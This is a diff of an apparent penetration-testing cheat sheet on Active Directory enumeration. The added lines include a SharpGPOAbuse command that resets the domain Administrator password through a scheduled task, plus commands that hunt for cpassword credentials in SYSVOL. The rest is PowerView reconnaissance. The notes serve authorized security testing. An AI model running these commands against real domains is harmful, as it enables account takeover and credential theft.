@@ -13,10 +13,11 @@ permalink: /pen/win/discov-ad
 <!-- vscode-markdown-toc -->
 * [prereq](#prereq)
 	* [install](#install)
+	* [load-env](#load-env)
 	* [spawn-cmd](#spawn-cmd)
 	* [run-powershell](#run-powershell)
+		* [bypass-exec-powershell](#bypass-exec-powershell)
 		* [load-powersploit](#load-powersploit)
-		* [load-env](#load-env)
 		* [no-errors](#no-errors)
 		* [bypass-amsi](#bypass-amsi)
 	* [run-bloodhound](#run-bloodhound)
@@ -28,12 +29,14 @@ permalink: /pen/win/discov-ad
 		* [shoot-delegations](#shoot-delegations)
 		* [shoot-priv-users](#shoot-priv-users)
 		* [shoot-priv-machines](#shoot-priv-machines)
+		* [shoot-gpo](#shoot-gpo)
 		* [shoot-shares](#shoot-shares)
 		* [shoot-mssql-servers](#shoot-mssql-servers)
 		* [shoot-spn](#shoot-spn)
 		* [shoot-npusers](#shoot-npusers)
 		* [shoot-acls](#shoot-acls)
 * [iter](#iter)
+	* [iter-sid](#iter-sid)
 	* [iter-memberof](#iter-memberof)
 	* [iter-scope](#iter-scope)
 * [refresh](#refresh)
@@ -75,6 +78,10 @@ Running powershell :
 
 - [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 
+### <a name='load-env'></a>load-env
+
+* URL suffix (F6 shortcut) : [/pen/setenv#win](/pen/setenv#win)
+
 ### <a name='spawn-cmd'></a>spawn-cmd
 
 Spawn an AD account with CMD.exe:
@@ -89,6 +96,9 @@ runas /netonly /user:adm_x@dom.corp powershell
 ```
 
 ### <a name='run-powershell'></a>run-powershell
+
+
+#### <a name='bypass-exec-powershell'></a>bypass-exec-powershell
 
 #### <a name='load-powersploit'></a>load-powersploit
 
@@ -109,32 +119,7 @@ Import-Module ./Recon.psm1
 gcm -m Recon
 ```
 
-#### <a name='load-env'></a>load-env
-Setting variables for copy/paste
-```powershell
-$zforest = "corp"
 
-$zdom = "contoso"
-$zdom_fqdn = $zdom + "." + $zforest
-$zdom_dn = "DC=contoso,DC=corp"
-
-$zdom_dc = "DC01"
-$zdom_dc_fqdn = $zdom_dc + "." + $zdom_fqdn
-$zdom_dc_san = $zdom_dc + "$"
-$zdom_dc_ip = ""
-
-$ztarg_computer = "PC001"
-$ztarg_computer_fqdn = $ztarg_computer + "." + $zdom_fqdn
-$ztarg_computer_san = $ztarg_computer + "$"
-$ztarg_computer_ip = ""
-
-$ztarg_user = "admin"
-$ztarg_OU = "Admins"
-```
-To verify the variables use the command:
-```powershell
-Get-Variable | Out-String
-```
 
 #### <a name='no-errors'></a>no-errors
 
@@ -222,7 +207,9 @@ Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $zdom_fqdn -D
 ```
 
 #### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
-```powwershell
+```powershell
+net accounts
+
 # enumerate the current domain controller policy
 $DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 $DCPolicy.PrivilegeRights # user privilege rights on the dc...
@@ -285,6 +272,17 @@ Privileged Machines
 # find any machine accounts in privileged groups
 Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Get-NetGroupMember -Recurse -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.MemberName -like '*$'}
 ```
+
+#### <a name='shoot-gpo'></a>shoot-gpo
+```
+# SharpGPOAbuse
+SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+
+# find cpassword
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+Get-GPPPassword.ps1
+```
+
 #### <a name='shoot-shares'></a>shoot-shares
 
 T1135 Network Shares
@@ -369,9 +367,13 @@ To ITERate when owning new privileges (aka new account with new user groups):
 - powershell: spawn a shell, [generate PS Credential object](/sysadmin/sys-win-ps-useful-queries/#PSCredentialinitialization), Rubeus PTT
 - impacket : PTH, PTT, clear password
 
-### <a name='iter-memberof'></a>iter-memberof
+### <a name='iter-sid'></a>iter-sid
+```
+whoami /priv
+wmic useraccount where name='melanie' get sid
+```
 
-User groups permissions
+### <a name='iter-memberof'></a>iter-memberof
 ```powershell
 # identify if the new account is 'memberof' new groups 
 get-netgroup -MemberIdentity $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt
